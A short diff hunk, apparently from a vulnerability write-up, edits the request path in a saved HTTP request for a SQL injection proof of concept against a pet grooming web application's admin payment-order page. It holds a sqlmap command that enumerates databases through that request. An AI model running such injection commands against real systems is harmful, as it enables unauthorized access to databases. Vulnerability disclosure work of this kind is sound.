@@ -87,7 +87,7 @@ Parameter: #1* ((custom) POST)
 ```
 sqlmap -r 1.req  --dbs -v 3 --batch --level 5
 //1.req
-POST /pet_grooming/admin/view_payorder.php HTTP/1.1
+POST /admin/view_payorder.php HTTP/1.1
 Host: 127.0.0.1
 sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
 sec-ch-ua-mobile: ?0
